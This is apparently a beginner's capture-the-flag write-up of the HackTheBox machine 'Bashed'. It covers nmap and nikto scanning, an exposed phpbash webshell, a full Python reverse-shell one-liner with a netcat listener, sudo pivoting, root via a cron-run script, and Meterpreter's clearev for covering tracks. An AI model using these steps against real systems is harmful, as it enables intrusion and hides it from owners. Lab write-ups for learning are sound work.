[Back to Main Page](../index.html) 

# Bashed on HackTheBox


![htb](https://www.yeahhub.com/wp-content/uploads/2018/03/hackthebox.png)



## Introduction

Bashed is a beginner's box which was the second CTF I ever attempted. When I tried it, I had booted up Kali and knew that a couple tools existed, but did not have any strategies, context or experience. 

This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work. The tools come with a stock Kali installation, unless otherwise mentioned.

## 1. Initial Scanning

All we do have is an IP so we start to run a nmap scan.

`nmap 10.10.10.68`

![1nmap](https://i.imgur.com/fyklCXk.png)

nmap did find TCP port 80.

Kali catogorizes most of the HTTP tools under "Web Application Analysis," so I took a peek and tried to get one of them working. I found the most useful starting commands for a website CTF is `nikto`

`nikto -h http://10.10.10.68:80`

Our `-h` flag tells nikto the location of our target. 

![1nikto](https://i.imgur.com/h1r2hqi.png)

Nikto shows us many intersting directories - one of them being /dev/. So I connected on it and found those .php scripts.

![2nikto](https://i.imgur.com/tupNPIp.png)


## 2. Using the found scripts to get access

The phpbash.py script is php based webshell, which allows us to set up a reverse shell. 
![1bashed](https://i.imgur.com/NUbWsT4.png)

First we create an netcat listener on our local kali machine.
`nc -lvnp 249`

Then I tried to create a normal connection, which got refused as there is no `nc -e`option on the machine.   
I found a python reverse shell in the web, which I executed with my options.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",249));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

![2bashed](https://i.imgur.com/SdTGlj9.png)

Python worked as expected. After scanning the files I found a user called scriptuser, so I executed the same command with `sudo -u scriptmanager ....` and got access as scriptmanager.

![3bashed](https://i.imgur.com/99Jd661.png)

Now I had access to the before found /script/ path. There I found another python script, which just echos a hello world.

![4bashed](https://i.imgur.com/vO4mImP.png)

The script appeared to run sometimes, so I just created my own one in the same folder via port 2493 to get access as root.

`cat > file.py`

![5bashed](https://i.imgur.com/1ZGLawt.png)

After waiting a minute or so, port 2493 listener connected to the machine.

![6bashed](https://i.imgur.com/aRauVQP.png)

And there we go, the connection as root!
Now we finished by capturing the flag!

![7bashed](https://i.imgur.com/mR7HorY.png)


## 5. Cleanup
 
Since this is a CTF, cleanup isn’t mandatory.
However, we want to develop good habits and operational security practice. Meterpreter has a `clearev` command that can be used to cover our tracks - let’s run it and be out of here.

![hacked](https://cdn-images-1.medium.com/max/1600/1*TtuBByJ52bSP-d2WPOczJg.png)
